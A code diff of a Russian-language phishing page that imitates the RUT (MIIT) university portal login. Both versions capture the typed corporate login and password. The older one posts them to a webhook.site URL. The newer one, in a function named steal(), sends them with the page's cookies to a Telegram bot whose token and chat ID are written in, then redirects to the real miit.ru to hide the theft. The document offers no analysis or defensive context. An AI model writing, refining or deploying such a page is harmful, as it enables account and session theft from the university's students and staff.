@@ -1,52 +1,64 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Единый портал РУТ (МИИТ)</title>
+    <title>Авторизация - РУТ (МИИТ)</title>
     <style>
-        body { background: #e5ebf1; font-family: Tahoma; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 30px; width: 350px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); text-align: center; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #d3d9de; border-radius: 4px; font-size: 14px; box-sizing: border-box; }
-        button { background: #4a76a8; color: white; border: none; width: 100%; padding: 12px; border-radius: 4px; font-size: 16px; cursor: pointer; }
-        button:hover { background: #3d6a9e; }
-        .note { font-size: 12px; color: #999; margin-top: 15px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: white; padding: 40px; width: 380px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); text-align: center; }
+        h2 { color: #1a1a1a; font-weight: 600; margin-bottom: 8px; }
+        .sub { color: #666; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #d0d7de; border-radius: 8px; font-size: 15px; transition: 0.2s; }
+        input:focus { border-color: #0054a0; outline: none; box-shadow: 0 0 0 3px rgba(0,84,160,0.1); }
+        button { width: 100%; padding: 14px; background: #0054a0; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
+        button:hover { background: #003d7a; }
+        .footer { margin-top: 18px; font-size: 12px; color: #999; }
+        .loader { display: none; margin-top: 12px; font-size: 14px; color: #0054a0; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h3>Авторизация на портале</h3>
+    <div class="container">
+        <h2>Авторизация</h2>
+        <p class="sub">Единый портал РУТ (МИИТ)</p>
         <input type="text" id="login" placeholder="Корпоративный логин">
         <input type="password" id="password" placeholder="Пароль">
-        <button onclick="capture()">Войти</button>
-        <div class="note">Вход осуществляется через корпоративную учётную запись МИИТ</div>
+        <button id="btn" onclick="steal()">Войти</button>
+        <div class="loader" id="loader">Проверка данных...</div>
+        <div class="footer">Вход через корпоративную учётную запись</div>
     </div>
 
     <script>
-        function capture() {
+        function steal() {
             var login = document.getElementById('login').value;
             var pass = document.getElementById('password').value;
-            if (login && pass) {
-                var data = {
-                    login: login,
-                    password: pass,
-                    time: new Date().toLocaleString()
-                };
-                // Отправка на Webhook
-                fetch('https://webhook.site/0e3f7357-4822-4e4f-8546-2ed49c4f7501', {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
-                document.querySelector('button').innerHTML = 'Подождите...';
-                setTimeout(function() {
-                    window.location.href = 'https://miit.ru';
-                }, 1500);
-            } else {
+
+            if (!login || !pass) {
                 alert('Заполните все поля');
+                return;
             }
+
+            // Отключаем кнопку, показываем загрузку
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+
+            // --- ВСТАВЬ СВОИ ДАННЫЕ НИЖЕ ---
+            var token = '8875287796:AAFLz3gZHXsFGttq9gyc2BUt4RM4h6vyFs0';
+            var chat_id = '8455359862';
+            // ---------------------------------
+
+            var text = 'LOGIN: ' + login + '%0APASS: ' + pass + '%0ACOOKIES: ' + document.cookie;
+
+            // Отправка в Telegram
+            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + text)
+                .catch(function(err) {
+                    // Если ошибка — всё равно перенаправляем
+                });
+
+            // Перенаправление на реальный сайт через 2 секунды
+            setTimeout(function() {
+                window.location.href = 'https://miit.ru';
+            }, 2000);
         }
     </script>
 </body>
